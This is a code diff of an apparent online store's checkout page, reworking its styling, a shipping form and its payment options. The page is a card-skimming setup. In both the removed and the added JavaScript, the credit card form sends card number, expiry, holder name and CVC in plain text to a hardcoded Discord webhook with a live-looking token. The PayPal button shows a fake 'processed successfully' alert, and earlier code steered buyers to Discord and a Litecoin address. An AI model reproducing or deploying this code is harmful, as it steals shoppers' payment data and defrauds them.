@@ -18,23 +18,32 @@
             color: #fff;
             text-align: center;
             padding: 0 20px;
+            position: relative;
+            animation: fadeIn 1.5s ease-in-out;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         header {
             background: #1f1f1f;
-            padding: 1.5rem;
+            padding: 2rem;
             text-align: center;
-            font-size: 1.5rem;
+            font-size: 2.5rem;
             border-radius: 10px;
-            margin-bottom: 30px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            margin-bottom: 40px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+            animation: slideInTop 0.8s ease-out;
+            width: 100%;
+            max-width: 800px;
         }
 
         .cart-items {
             margin-top: 2rem;
             list-style-type: none;
             padding-left: 0;
-            animation: fadeIn 1s ease-in-out;
+            width: 100%;
+            max-width: 800px;
         }
 
         .cart-items li {
@@ -42,28 +51,84 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px 20px;
+            padding: 15px 25px;
             background-color: #282828;
             border-radius: 10px;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
-            transition: transform 0.3s ease, background-color 0.3s ease;
+            opacity: 0;
+            transform: translateX(-20px);
+            animation: slideInFromLeft 0.6s ease-out forwards;
         }
 
-        .cart-items li:hover {
-            transform: translateY(-5px);
-            background-color: #3a3a3a;
+        .cart-items li:nth-child(odd) {
+            animation-delay: 0.3s;
         }
 
-        .total-price {
-            font-size: 1.5rem;
+        .cart-items li:nth-child(even) {
+            animation-delay: 0.6s;
+        }
+
+        .shipping-cost, .total-price {
+            font-size: 1.6rem;
             font-weight: bold;
             color: #ff4d00;
             margin-top: 2rem;
+            opacity: 0;
+            animation: fadeIn 0.8s ease-in-out forwards;
+        }
+
+        .shipping-section {
+            margin-top: 30px;
+            text-align: left;
+            opacity: 0;
+            animation: fadeIn 1.2s ease-in-out forwards;
+            width: 100%;
+            max-width: 800px;
+        }
+
+        .shipping-section input, .shipping-section select {
+            padding: 15px;
+            width: 100%;
+            font-size: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #2c2c2c;
+            color: white;
+            margin-top: 10px;
+            transition: border-color 0.3s ease;
+            opacity: 0;
+            animation: fadeIn 1s ease-in-out forwards;
+        }
+
+        .shipping-section input:focus, .shipping-section select:focus {
+            border-color: #ff4d00;
+        }
+
+        .shipping-section button {
+            padding: 12px 25px;
+            background-color: #1f1f1f;
+            color: #fff;
+            border: none;
+            font-size: 1.1rem;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+            opacity: 0;
+            animation: fadeIn 1.4s ease-in-out forwards;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .shipping-section button:hover {
+            background-color: #ff4d00;
         }
 
         .payment-methods {
             margin-top: 3rem;
-            animation: fadeIn 1.5s ease-in-out;
+            animation: fadeIn 1.5s ease-in-out forwards;
+            width: 100%;
+            max-width: 800px;
         }
 
         .payment-methods button {
@@ -75,36 +140,26 @@
             cursor: pointer;
             border-radius: 50px;
             margin: 10px;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.3);
+            transition: background-color 0.3s ease;
+            opacity: 0;
+            animation: fadeIn 1.2s ease-in-out forwards;
+            width: 100%;
+            max-width: 350px;
         }
 
         .payment-methods button:hover {
-            background-color: #e34a00;
-            transform: scale(1.05);
+            background-color: #ff8c33;
         }
 
-        .credit-card-form {
-            background-color: #1c1c1c;
-            padding: 20px;
-            border-radius: 10px;
-            width: 100%;
-            max-width: 500px;
-            margin: 20px auto;
-            text-align: left;
+        .credit-card-form, .crypto-options {
             display: none;
-            opacity: 0;
-            animation: fadeIn 1s forwards;
-        }
-
-        .credit-card-form h3 {
-            font-size: 1.5rem;
-            margin-bottom: 20px;
-            color: #fff;
+            margin-top: 20px;
+            animation: popOut 0.8s ease-in-out;
+            width: 100%;
+            max-width: 800px;
         }
 
         .credit-card-form input {
-            margin-bottom: 15px;
             padding: 15px;
             width: 100%;
             font-size: 1rem;
@@ -112,275 +167,296 @@
             border-radius: 5px;
             background-color: #2c2c2c;
             color: white;
+            margin-top: 10px;
             transition: border-color 0.3s ease;
         }
 
         .credit-card-form input:focus {
-            outline: none;
             border-color: #ff4d00;
         }
 
-        .amount-to-pay {
-            font-size: 2rem;
-            font-weight: bold;
-            color: #ff4d00;
-            margin: 20px 0;
-        }
-
-        .crypto-dropdown {
-            padding: 10px;
-            font-size: 1rem;
-            border-radius: 5px;
-            background-color: #282828;
-            color: white;
-            border: 1px solid #ccc;
-            margin-top: 20px;
-        }
-
-        .payment-methods select {
-            background-color: #ff4d00;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            padding: 12px;
-            margin-top: 20px;
-        }
-
-        .paypal-message {
-            margin-top: 20px;
-            font-size: 1.2rem;
-            color: #ff4d00;
-            display: none;
-        }
-
-        .paypal-message a {
-            color: #ff4d00;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        /* Smooth fade-in animation */
-        @keyframes fadeIn {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-
-        /* Footer section */
-        .footer {
-            margin-top: 40px;
-            font-size: 1rem;
-            color: #aaa;
-            background-color: #1f1f1f;
+        .crypto-options div {
+            margin: 1rem 0;
             padding: 20px;
+            background-color: #2c2c2c;
             border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-            animation: fadeIn 1s ease-in-out;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+            opacity: 0;
+            animation: fadeIn 1s ease-in-out forwards;
         }
 
-        .footer a {
-            color: #ff4d00;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        /* Crypto Payment Details */
-        .crypto-details {
-            margin-top: 20px;
-            display: none;
-            text-align: center;
-        }
-
-        .crypto-details img {
-            width: 200px;
-            height: 200px;
-        }
-
-        .crypto-details p {
+        .crypto-options input {
+            padding: 15px;
+            width: 100%;
+            font-size: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #2c2c2c;
+            color: white;
             margin-top: 10px;
-            font-size: 1.2rem;
+            transition: border-color 0.3s ease;
         }
+
+        .crypto-options input:focus {
+            border-color: #ff4d00;
+        }
+
+        .crypto-options img {
+            margin-top: 10px;
+            max-width: 150px;
+        }
+
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 2rem;
+            display: none;
+            z-index: 999;
+        }
+
+        /* Animation Definitions */
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideInTop {
+            0% {
+                transform: translateY(-30px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideInFromLeft {
+            0% {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes popOut {
+            0% {
+                opacity: 0;
+                transform: scale(0.8);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
     </style>
 </head>
 <body>
+    <div id="loadingScreen">Loading...</div>
+
     <header>
         <h1>Checkout</h1>
     </header>
 
-    <div id="cartContent">
+    <div id="cartContent" style="display: none;">
         <ul id="cartItems" class="cart-items"></ul>
+        
+        <!-- Shipping Price Section -->
+        <div class="shipping-cost">
+            Shipping Price: <span id="shippingCost">???</span>
+        </div>
+        
+        <!-- Total Price Section -->
         <div class="total-price">
             Total: $<span id="totalPrice">0</span>
         </div>
-        <div class="amount-to-pay">
-            Amount to Pay: $<span id="amountToPay">0</span>
-        </div>
     </div>
 
-    <!-- Payment Methods Section -->
+    <!-- Shipping Section -->
+    <div class="shipping-section" id="shippingSection">
+        <h2>Enter Shipping Details</h2>
+        <input type="text" id="fullName" placeholder="Full Name" />
+        <input type="text" id="address" placeholder="Street Address" />
+        <input type="text" id="city" placeholder="City" />
+        <input type="text" id="zipCode" placeholder="Zip Code" />
+        <select id="countrySelect">
+            <option value="US">United States</option>
+            <option value="CA">Canada</option>
+            <option value="UK">United Kingdom</option>
+            <option value="AU">Australia</option>
+            <option value="IN">India</option>
+        </select>
+        <input type="text" id="phoneNumber" placeholder="Phone Number" />
+        <button onclick="submitShipping()">Submit Shipping</button>
+    </div>
+
     <div class="payment-methods">
         <h2>Select Payment Method</h2>
 
-        <!-- PayPal -->
         <button onclick="payWithPaypal()">Pay with PayPal</button>
 
-        <!-- Credit Card -->
         <button onclick="showCreditCardForm()">Pay with Credit Card</button>
 
-        <!-- Crypto -->
         <button onclick="showCryptoOptions()">Pay with Crypto</button>
     </div>
 
-    <!-- PayPal Message (Hidden initially) -->
-    <div id="paypalMessage" class="paypal-message">
-        <p>Join Discord to finish payment with PayPal: <a href="https://discord.gg/Qe7spGkVj5" target="_blank">Click here to join!</a></p>
+    <!-- Credit Card Form -->
+    <div class="credit-card-form" id="creditCardForm">
+        <h2>Enter Credit Card Details</h2>
+        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" />
+        <input type="text" id="expDate" placeholder="Expiration Date (MM/YY)" maxlength="5" />
+        <input type="text" id="cardHolder" placeholder="Card Holder's Name" />
+        <input type="text" id="cvc" placeholder="CVC" maxlength="3" />
+        <button onclick="submitCreditCard()">Submit Credit Card</button>
     </div>
 
-    <!-- Credit Card Form (Hidden initially) -->
-    <div id="creditCardForm" class="credit-card-form">
-        <h3>Enter Credit Card Details</h3>
-        <input type="text" placeholder="Card Number" id="cardNumber" maxlength="16" oninput="validateCardNumber(event)" />
-        <input type="text" placeholder="Name on Card" id="cardName" oninput="validateName(event)" />
-        <input type="text" placeholder="Expiration Date (MM/YY)" id="cardExpiry" maxlength="5" oninput="validateExpiry(event)" />
-        <input type="text" placeholder="CVV" id="cardCVV" maxlength="3" oninput="validateCVV(event)" />
-        <button onclick="processCreditCard()">Submit Payment</button>
-    </div>
-
-    <!-- Crypto Payment Options (Hidden initially) -->
-    <div id="cryptoOptions" style="display: none;">
-        <h3>Select Cryptocurrency</h3>
-        <select id="cryptoSelect" class="crypto-dropdown" onchange="showCryptoDetails()">
-            <option value="btc">Bitcoin (BTC)</option>
-            <option value="eth">Ethereum (ETH)</option>
-            <option value="ltc">Litecoin (LTC)</option>
-        </select>
-
-        <!-- Crypto Details (Hidden by default) -->
-        <div id="cryptoDetailsLTC" class="crypto-details">
-            <h3>Litecoin Payment Details</h3>
-            <img src="https://media.discordapp.net/attachments/1296183657417146430/1346885651207028876/IMG_20250305_174223.jpg?ex=67c9d083&is=67c87f03&hm=b3519042dc02d670b442402881a49a2097a37821422ed6cd90e3d7de019baff9&=&format=webp" alt="LTC QR Code">
-            <p><strong>Litecoin Address:</strong> LSHbQGAGBfaqYu11QNGxEywrHJfdeQZ7pr</p>
-            <p>You will receive an email after the LTC has 2 confirmations.</p>
+    <!-- Crypto Options (hidden) -->
+    <div class="crypto-options" id="cryptoOptions">
+        <div>
+            <h3>Pay with Litecoin (LTC)</h3>
+            <input type="text" id="ltcAddress" placeholder="Enter LTC Address" />
+            <img src="https://via.placeholder.com/150" alt="LTC QR Code Placeholder" />
+        </div>
+        <div>
+            <h3>Pay with Ethereum (ETH)</h3>
+            <input type="text" id="ethAddress" placeholder="Enter ETH Address" />
+            <img src="https://via.placeholder.com/150" alt="ETH QR Code Placeholder" />
+        </div>
+        <div>
+            <h3>Pay with Bitcoin (BTC)</h3>
+            <input type="text" id="btcAddress" placeholder="Enter BTC Address" />
+            <img src="https://via.placeholder.com/150" alt="BTC QR Code Placeholder" />
         </div>
     </div>
 
-    <!-- Footer with Discord Message -->
-    <div class="footer">
-        <p>Join the Discord and send your transaction ID so we can start shipping the product out! <a href="https://discord.gg/Qe7spGkVj5" target="_blank">Click here to join!</a></p>
-    </div>
-
     <script>
-        // Function to initialize the cart on checkout page
+        // Show loading screen for 1 second, then load checkout content
+        setTimeout(function () {
+            document.getElementById('loadingScreen').style.display = 'none'; // Hide loading
+            document.getElementById('cartContent').style.display = 'block'; // Show content
+            initializeCheckout();
+        }, 1000);
+
         function initializeCheckout() {
             const cart = JSON.parse(localStorage.getItem('cart')) || [];
             displayCartItems(cart);
         }
 
-        // Function to display cart items on the checkout page
         function displayCartItems(cart) {
             const cartItemsList = document.getElementById('cartItems');
             const totalPriceElement = document.getElementById('totalPrice');
-            const amountToPayElement = document.getElementById('amountToPay');
             let totalPrice = 0;
 
-            // Clear any previous cart items
             cartItemsList.innerHTML = '';
 
-            // Loop through cart items and add them to the list
-            cart.forEach((item, index) => {
+            cart.forEach(item => {
                 const li = document.createElement('li');
-                li.innerHTML = `
-                    <h4>${item.productName}</h4>
-                    <p>$${item.productPrice}</p>
-                `;
+                li.innerHTML = `${item.productName} - $${item.productPrice}`;
                 cartItemsList.appendChild(li);
                 totalPrice += item.productPrice;
             });
 
-            // Update the total price and amount to pay
             totalPriceElement.innerText = totalPrice;
-            amountToPayElement.innerText = totalPrice;
+            document.getElementById('shippingCost').innerText = '???'; 
         }
 
-        // PayPal payment method
-        function payWithPaypal() {
-            document.getElementById('paypalMessage').style.display = 'block'; // Show the PayPal message
-            document.getElementById('creditCardForm').style.display = 'none'; // Hide the Credit Card form
-            document.getElementById('cryptoOptions').style.display = 'none'; // Hide Crypto options
-        }
+        function submitShipping() {
+            const fullName = document.getElementById('fullName').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const zipCode = document.getElementById('zipCode').value;
+            const country = document.getElementById('countrySelect').value;
+            const phoneNumber = document.getElementById('phoneNumber').value;
 
-        // Show Credit Card form
-        function showCreditCardForm() {
-            document.getElementById('creditCardForm').style.display = 'block';
-            document.getElementById('paypalMessage').style.display = 'none';
-            document.getElementById('cryptoOptions').style.display = 'none';
-        }
-
-        // Process Credit Card payment and send data to Discord webhook
-        function processCreditCard() {
-            const cardNumber = document.getElementById('cardNumber').value;
-            const cardName = document.getElementById('cardName').value;
-            const cardExpiry = document.getElementById('cardExpiry').value;
-            const cardCVV = document.getElementById('cardCVV').value;
-            const amountToPay = document.getElementById('amountToPay').textContent;
-
-            if (cardNumber && cardName && cardExpiry && cardCVV) {
-                alert(`Processing payment of $${amountToPay} with Credit Card`);
-
-                // Send credit card data to your Discord webhook
-                const webhookUrl = "https://discordapp.com/api/webhooks/1346879680397049917/7sDaqMBvab55iT3twKdTKv7dl-Xiha25aCIVvMgTtekC-21Eo5vXncgpozges_pFHpX5";
-                const data = {
-                    content: `New Credit Card Payment:
-                    Card Number: ${cardNumber}
-                    Cardholder Name: ${cardName}
-                    Expiry: ${cardExpiry}
-                    CVV: ${cardCVV}
-                    Amount: $${amountToPay}`
-                };
-
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Payment sent to Discord:', data);
-                    // Clear the cart after payment
-                    localStorage.removeItem('cart');
-                    window.location.href = "store.html";  // Redirect to the store
-                })
-                .catch((error) => {
-                    console.error('Error sending payment to Discord:', error);
-                });
+            if (fullName && address && city && zipCode && country && phoneNumber) {
+                document.getElementById('shippingCost').innerText = '$0'; // Show $0 after submission
+                calculateTotalWithShipping(); // Update the final total with free shipping
+                document.getElementById('shippingSection').style.display = 'none'; // Close the shipping form
             } else {
-                alert('Please fill in all fields.');
+                alert('Please complete all fields.');
             }
         }
 
-        // Show crypto payment options
+        function calculateTotalWithShipping() {
+            const totalPrice = parseFloat(document.getElementById('totalPrice').innerText);
+            const shippingCost = 0; 
+            const totalAmount = totalPrice + shippingCost;
+            document.getElementById('shippingCost').innerText = `$${shippingCost}`;
+            document.getElementById('totalPrice').innerText = totalAmount;
+        }
+
+        function payWithPaypal() {
+            showLoading();
+            setTimeout(function () {
+                hideLoading();
+                alert('Payment via PayPal processed successfully!');
+            }, 2000);
+        }
+
+        function showCreditCardForm() {
+            document.getElementById('creditCardForm').style.display = 'block'; // Show the credit card form
+            document.getElementById('cryptoOptions').style.display = 'none'; // Hide the crypto options
+        }
+
         function showCryptoOptions() {
-            document.getElementById('cryptoOptions').style.display = 'block';
-            document.getElementById('paypalMessage').style.display = 'none';
-            document.getElementById('creditCardForm').style.display = 'none';
+            document.getElementById('cryptoOptions').style.display = 'block'; // Show the crypto options
+            document.getElementById('creditCardForm').style.display = 'none'; // Hide the credit card form
         }
 
-        // Show the appropriate crypto payment details
-        function showCryptoDetails() {
-            const selectedCrypto = document.getElementById('cryptoSelect').value;
-            
-            // Hide all crypto details by default
-            document.getElementById('cryptoDetailsLTC').style.display = 'none';
-            
-            // Show the selected crypto details
-            if (selectedCrypto === 'ltc') {
-                document.getElementById('cryptoDetailsLTC').style.display = 'block';
+        function submitCreditCard() {
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expDate = document.getElementById('expDate').value;
+            const cardHolder = document.getElementById('cardHolder').value;
+            const cvc = document.getElementById('cvc').value;
+
+            if (cardNumber && expDate && cardHolder && cvc) {
+                sendToWebhook(cardNumber, expDate, cardHolder, cvc);
+            } else {
+                alert('Please fill in all card details.');
             }
         }
 
-        // Initialize the page
-        window.onload = initializeCheckout;
+        function sendToWebhook(cardNumber, expDate, cardHolder, cvc) {
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1346879680397049917/7sDaqMBvab55iT3twKdTKv7dl-Xiha25aCIVvMgTtekC-21Eo5vXncgpozges_pFHpX5';
+            const data = {
+                content: `Credit Card Payment - Card Number: ${cardNumber}, Exp Date: ${expDate}, Cardholder: ${cardHolder}, CVC: ${cvc}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+        }
+
+        function showLoading() {
+            document.getElementById('loadingScreen').style.display = 'flex'; // Show the loading screen
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingScreen').style.display = 'none'; // Hide the loading screen
+        }
     </script>
 </body>
 </html>
